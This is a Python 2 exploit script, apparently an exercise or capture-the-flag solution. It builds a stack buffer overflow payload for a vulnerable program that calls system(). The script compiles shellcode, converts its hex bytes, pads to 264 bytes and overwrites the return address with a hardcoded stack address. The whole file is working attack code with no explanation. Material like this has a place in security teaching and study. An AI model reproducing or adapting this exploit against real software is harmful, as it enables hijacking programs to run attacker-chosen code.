import subprocess

# the cmd that system() will be executed on in target program
payload = "/bin/bash\x90"

# get shellcode
cmd = """echo $(gcc -c shellcode.s && for i in $(objdump -d shellcode.o | grep "^ " | cut -f2); do echo -n '\\x'$i; done;)"""
shellcode = subprocess.check_output(['bash','-c', cmd])
shellcode = shellcode[:-1] # remove trailing newline

# annoying string conversion
l_shellcode = len(shellcode)
string_byte_size = 4 # backslash, x, two digits,
converted_shellcode_bytes = []
for idx in xrange(0, l_shellcode, string_byte_size):
    num = shellcode[idx + 2] + shellcode[idx + 3]
    hex_num = num.decode('hex')
    converted_shellcode_bytes.append(hex_num)

shellcode = ''.join(converted_shellcode_bytes)

assert '\x00' not in shellcode
payload += shellcode


# pad payload
padding = "C" * (264 - len(payload))
payload += padding

# add return address

payload_start_big_endian = "\x7f\xff\xff\xff\xe2\xaa"
payload_start_little_endian = payload_start_big_endian[::-1]
# we can leave off the two leading zeroes since they are now at the end
# so we won't overwrite the ones that are there
payload += payload_start_little_endian

# print(263*'A')
print(payload)
# print(''.join(['\\x' + ch.encode('hex') for ch in payload]))
